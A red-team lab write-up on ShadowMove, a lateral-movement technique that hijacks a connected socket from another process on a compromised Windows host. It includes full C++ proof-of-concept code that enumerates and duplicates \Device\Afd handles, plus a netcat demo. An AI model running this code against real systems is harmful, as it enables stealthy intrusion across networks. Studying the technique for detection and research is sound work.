# ShadowMove: Lateral Movement by Duplicating Existing Sockets

[ShadowMove](https://www.usenix.org/system/files/sec20summer_niakanlahiji_prepub.pdf) \(original paper by researchers Amirreza Niakanlahiji, Jinpeng Wei, Md Rabbi Alam, Qingyang Wang and Bei-Tseng Chu, go check it for full details\) is a lateral movement technique that works by stealing \(duplicating\) an existing socket connected to a remote host, from a running process on a system an adversary has compromised.

This is a quick lab to familiarize with the technique, while using the PoC by [Juan Manuel Fernández](https://www.twitter.com/@TheXC3LL) which he provided in his [post](https://adepts.of0x.cc/shadowmove-hijack-socket/).

## Overview

The below is a simplified diagram showing how the technique works and how I tested it in my lab:

![Source and Target hosts communicating using ShadowMove technique](../../.gitbook/assets/image%20%28747%29.png)

Let's see what we have in the above diagram:

1. On the left, we have a compromised host \(for example, we landed on this host by means of a successful phish\) `192.168.1.117` - this is the source host from which we want to move laterally to the target host `192.168.56.102`.
2. On the right, we have the target host `192.168.56.102,` which has a listening socket on TCP port 80, by means of running `nc -lvp 80`
3. Source host `192.168.1.117` has an established connection to the target host `192.168.56.102:80` via nc.exe.
4. On the source host, there's `ShadowMove.exe` process running - this is the process that executes the ShadowMove lateral movement technique. Note that it does not establish any connections to remote hosts at any point in time during its lifetime - this is the beauty of the technique.
5. On the source host, `ShadowMove.exe` enumerates all handles `nc.exe` has opened and looks for handles to `\Device\Afd`, which are used for network socket communications. Once found, the handle is used to create a duplicate socket with `WSADuplicateSocketW` and `WSASocket` API calls. Once the shared socket is created, `getpeername` is used to check if the destination address of the socket is that of target host's IP address, which in our case is `192.168.56.102`.
6. Once the shared socket is created based on the `\Device\Afd` handle pointing to the target host, as found in step 5, `ShadowMove.exe` can now write to that socket with `send` and read from it with `recv` API calls.

{% hint style="warning" %}
It's important to stress once more, the ShadowMove.exe **does not** **create any TCP connections to the target host.** Instead, it reuses the existing connected socket to `192.168.56.102:80`  between the source and target host, that was established by the nc.exe process on the source system - and this is the key point of this lateral movement technique.
{% endhint %}

## Code

Below is the code [written](https://adepts.of0x.cc/shadowmove-hijack-socket/) by [Juan Manuel Fernández](https://www.twitter.com/@TheXC3LL) which I modified slightly, so that it would compile without errors in my development environment with Visual Studio 2019:

```cpp
// PoC of ShadowMove Gateway by Juan Manuel Fernández (@TheXC3LL) 

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <Windows.h>
#include <stdio.h>

#pragma comment(lib,"WS2_32")

// Most of the code is adapted from https://github.com/Zer0Mem0ry/WindowsNT-Handle-Scanner/blob/master/FindHandles/main.cpp
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define SystemHandleInformation 16
#define ObjectNameInformation 1

typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);
typedef NTSTATUS(NTAPI* _NtDuplicateObject)(
	HANDLE SourceProcessHandle,
	HANDLE SourceHandle,
	HANDLE TargetProcessHandle,
	PHANDLE TargetHandle,
	ACCESS_MASK DesiredAccess,
	ULONG Attributes,
	ULONG Options
	);
typedef NTSTATUS(NTAPI* _NtQueryObject)(
	HANDLE ObjectHandle,
	ULONG ObjectInformationClass,
	PVOID ObjectInformation,
	ULONG ObjectInformationLength,
	PULONG ReturnLength
	);

typedef struct _SYSTEM_HANDLE
{
	ULONG ProcessId;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG HandleCount;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;


typedef enum _POOL_TYPE
{
	NonPagedPool,
	PagedPool,
	NonPagedPoolMustSucceed,
	DontUseThisType,
	NonPagedPoolCacheAligned,
	PagedPoolCacheAligned,
	NonPagedPoolCacheAlignedMustS
} POOL_TYPE, * PPOOL_TYPE;

typedef struct _OBJECT_NAME_INFORMATION
{
	UNICODE_STRING Name;
} OBJECT_NAME_INFORMATION, * POBJECT_NAME_INFORMATION;

PVOID GetLibraryProcAddress(const char *LibraryName, const char *ProcName)
{
	return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
}

SOCKET findTargetSocket(DWORD dwProcessId, LPSTR dstIP) {
	HANDLE hProc;
	PSYSTEM_HANDLE_INFORMATION handleInfo;
	DWORD handleInfoSize = 0x10000;
	NTSTATUS status;
	DWORD returnLength;
	WSAPROTOCOL_INFOW wsaProtocolInfo = { 0 };
	SOCKET targetSocket;

	// Open target process with PROCESS_DUP_HANDLE rights
	hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwProcessId);
	if (!hProc) {
		printf("[!] Error: could not open the process!\n");
		exit(-1);
	}
	printf("[+] Handle to process obtained!\n");

	// Find the functions
	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetLibraryProcAddress("ntdll.dll", "NtQuerySystemInformation");
	_NtDuplicateObject NtDuplicateObject = (_NtDuplicateObject)GetLibraryProcAddress("ntdll.dll", "NtDuplicateObject");
	_NtQueryObject NtQueryObject = (_NtQueryObject)GetLibraryProcAddress("ntdll.dll", "NtQueryObject");

	// Retrieve handles from the target process
	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);

	printf("[+] Found [%d] handles in PID %d\n============================\n", handleInfo->HandleCount, dwProcessId);

	// Iterate 
	for (DWORD i = 0; i < handleInfo->HandleCount; i++) {

		// Check if it is the desired type of handle
		if (handleInfo->Handles[i].ObjectTypeNumber == 0x24) {

			SYSTEM_HANDLE handle = handleInfo->Handles[i];
			HANDLE dupHandle = NULL;
			POBJECT_NAME_INFORMATION objectNameInfo;

			// Duplicate handle
			NtDuplicateObject(hProc, (HANDLE)handle.Handle, GetCurrentProcess(), &dupHandle, PROCESS_ALL_ACCESS, FALSE, DUPLICATE_SAME_ACCESS);
			objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);

			// Get handle info
			NtQueryObject(dupHandle, ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);

			// Narow the search checking if the name length is correct (len(\Device\Afd) == 11 * 2)
			if (objectNameInfo->Name.Length == 22) {
				printf("[-] Testing %d of %d\n", i, handleInfo->HandleCount);

				// Check if it ends in "Afd"
				LPWSTR needle = (LPWSTR)malloc(8);
				memcpy(needle, objectNameInfo->Name.Buffer + 8, 6);
				if (needle[0] == 'A' && needle[1] == 'f' && needle[2] == 'd') {

					// We got a candidate
					printf("\t[*] \\Device\\Afd found at %d!\n", i);

					// Try to duplicate the socket
					status = WSADuplicateSocketW((SOCKET)dupHandle, GetCurrentProcessId(), &wsaProtocolInfo);
					if (status != 0) {
						printf("\t\t[X] Error duplicating socket!\n");
						free(needle);
						free(objectNameInfo);
						CloseHandle(dupHandle);
						continue;
					}

					// We got it?
					targetSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, &wsaProtocolInfo, 0, WSA_FLAG_OVERLAPPED);
					if (targetSocket != INVALID_SOCKET) {
						struct sockaddr_in sockaddr;
						DWORD len;
						len = sizeof(SOCKADDR_IN);

						// It this the socket?
						if (getpeername(targetSocket, (SOCKADDR*)&sockaddr, (int*)&len) == 0) {
							if (strcmp(inet_ntoa(sockaddr.sin_addr), dstIP) == 0) {
								printf("\t[*] Duplicated socket (%s)\n", inet_ntoa(sockaddr.sin_addr));
								free(needle);
								free(objectNameInfo);
								return targetSocket;
							}
						}

					}

					free(needle);
				}

			}
			free(objectNameInfo);

		}
	}

	return 0;
}


int main(int argc, char** argv) {
	WORD wVersionRequested;
	WSADATA wsaData;
	DWORD dwProcessId;
	LPSTR dstIP = NULL;
	SOCKET targetSocket;
	char buff[255] = { 0 };

	printf("\t\t\t-=[ ShadowMove Gateway PoC ]=-\n\n");

	// smgateway.exe [PID] [IP dst]
	/* It's just a PoC, we do not validate the args. But at least check if number of args is right X) */
	if (argc != 3) {
		printf("[!] Error: syntax is %s [PID] [IP dst]\n", argv[0]);
		exit(-1);
	}
	dwProcessId = strtoul(argv[1], NULL, 10);
	dstIP = (LPSTR)malloc(strlen(argv[2]) * (char)+1);
	memcpy(dstIP, argv[2], strlen(dstIP));


	// Classic
	wVersionRequested = MAKEWORD(2, 2);
	WSAStartup(wVersionRequested, &wsaData);

	targetSocket = findTargetSocket(dwProcessId, dstIP);
	send(targetSocket, "hello from shadowmove and reused socket!\n", strlen("hello from shadowmove and reused socket!\n"), 0);
	recv(targetSocket, buff, 255, 0);
	printf("\n[*] Message from target to shadowmove:\n\n %s\n", buff);
	return 0;
}
```

## Demo

Once we have compiled the above code, we can test the technique as it was described earlier in our [diagram](shadowmove-lateral-movement-by-stealing-duplicating-existing-connected-sockets.md#overview). Below highlighted are key aspects of the demo:

* In the top right corner, there's a target system `192.168.56.102` with `nc` listening on port `80`.
* In the top left corner, there's a compromised \(source\) system and `nc.exe` establishing a connection to target host `192.168.56.102:80`.
* In the bottom left corner, there's `ShadowMove.exe` running on the source system, which enumerates handles of the `nc.exe` running on the source system, finds a socket that is connected to `192.168.56.102:80` \(target system\), duplicates it and writes `hello from shadowmove and reused socket!` to it, which is then received on the target system \(top right\). 
* Target system \(top right\) writes back to the same socket `hello from target to shadowmove`, which is received by `shadowmove.exe` on the source system \(bottom left\).
* In the bottom right, we see a `ProcessHacker` that shows that at no point in time `shadowmove.exe` establishes no TCP connections.

![Demo: ShadowMove Lateral Movement in Action](../../.gitbook/assets/shadowmove-lateral-movement%20%281%29.gif)

## References

[https://www.usenix.org/system/files/sec20summer\_niakanlahiji\_prepub.pdf](https://www.usenix.org/system/files/sec20summer_niakanlahiji_prepub.pdf)

{% embed url="https://adepts.of0x.cc/shadowmove-hijack-socket/" %}

